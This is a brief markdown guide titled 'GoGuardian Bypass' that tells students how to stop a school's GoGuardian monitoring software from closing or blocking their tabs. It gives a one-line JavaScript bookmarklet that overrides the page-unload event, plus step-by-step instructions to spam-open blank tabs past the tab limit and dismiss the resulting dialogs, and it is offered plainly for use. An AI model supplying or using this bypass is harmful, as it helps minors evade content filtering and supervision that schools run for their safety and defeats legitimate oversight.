### GoGuardian Bypass
**Caution!** Teachers can still see your screen, but they can't block or close any of your tabs. <br>
You must have a tab limit for this to work. <br> <br>
Instructions: <br>
1. Create a bookmark named anything with this code: `javascript: window.onbeforeunload = ()=>{return false;}`
2. Hold down CTRL and then SPAM CLICK the bookmark until you're well above the tab limit, opening a bunch of about:blank pages.
3. It might ask if you want to leave this page, this is GoGuardian trying to close it.
4. Say No and click Prevent from creating additional dialogues.
5. Enjoy your unblocked stay!
 <br>
Close all of your about:blank tabs to undo.
